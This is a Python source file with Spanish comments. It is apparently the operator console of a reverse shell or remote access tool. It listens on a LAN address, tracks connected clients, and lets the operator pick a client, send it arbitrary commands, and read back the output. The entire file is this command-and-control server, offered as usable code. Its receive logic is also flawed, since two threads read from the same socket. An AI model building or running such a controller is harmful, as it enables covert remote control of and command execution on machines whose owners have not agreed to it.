import socket
import threading

clients = {}  # Diccionario para almacenar conexiones de clientes y direcciones
lock = threading.Lock()  # Para proteger el acceso concurrente al diccionario de clientes

def handle_client(conn, address):
    client_id = f"{address[0]}:{address[1]}"  # Identificador único para el cliente
    with lock:
        clients[client_id] = conn  # Agregar cliente al diccionario

    while True:
        try:
            command = conn.recv(1024).decode('utf-8', errors='ignore')
            if not command:
                break

            data = b''
            while True:
                part = conn.recv(4096)
                data += part
                if len(part) < 4096:
                    break

            try:
                print(f"Salida del cliente {client_id}:\n{data.decode('utf-8', errors='ignore')}")
            except UnicodeDecodeError:
                print(f"Error de decodificación en la salida del cliente {client_id}")

        except ConnectionResetError:
            break

    with lock:
        del clients[client_id]  # Eliminar cliente del diccionario cuando se desconecta
    conn.close()

def server_program():
    host = '192.168.1.90'
    port = 5001  # Cambiar el puerto si es necesario

    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Permitir reutilización del socket
    server_socket.bind((host, port))
    server_socket.listen(5)  # Permitir hasta 5 conexiones en cola

    print("Servidor escuchando en puerto", port)

    def accept_clients():
        while True:
            conn, address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, address))
            client_thread.start()

    accept_thread = threading.Thread(target=accept_clients)
    accept_thread.start()

    while True:
        print("\n---- Menú de Administración ----")
        print("1. Entrar en un cliente")
        print("2. Ver clientes conectados")
        print("3. Desconectar cliente")
        print("4. Salir")
        choice = input("Seleccione una opción: ")

        if choice == '1':
            client_id = input("Ingrese el ID del cliente: ")
            if client_id in clients:
                interact_with_client(client_id)
            else:
                print("Cliente no encontrado.")
        elif choice == '2':
            with lock:
                print("Clientes conectados:")
                for client_id in clients:
                    print(client_id)
        elif choice == '3':
            client_id = input("Ingrese el ID del cliente a desconectar: ")
            with lock:
                if client_id in clients:
                    clients[client_id].send('exit'.encode('utf-8'))
                    clients[client_id].close()
                    del clients[client_id]
                else:
                    print("Cliente no encontrado.")
        elif choice == '4':
            print("Cerrando el servidor...")
            with lock:
                for client_id in list(clients.keys()):
                    clients[client_id].send('exit'.encode('utf-8'))
                    clients[client_id].close()
                    del clients[client_id]
            server_socket.close()
            break
        else:
            print("Opción inválida. Por favor, seleccione una opción válida.")

def interact_with_client(client_id):
    conn = clients[client_id]
    while True:
        command = input(f"Cliente {client_id} -> ")
        if command.lower() == 'exit_client':
            print(f"Saliendo de la interacción con el cliente {client_id}")
            break

        conn.send(command.encode('utf-8'))
        
        data = b''
        while True:
            part = conn.recv(4096)
            data += part
            if len(part) < 4096:
                break
        
        try:
            print(f"Salida del cliente {client_id}:\n{data.decode('utf-8', errors='ignore')}")
        except UnicodeDecodeError:
            print(f"Error de decodificación en la salida del cliente {client_id}")

if __name__ == '__main__':
    server_program()
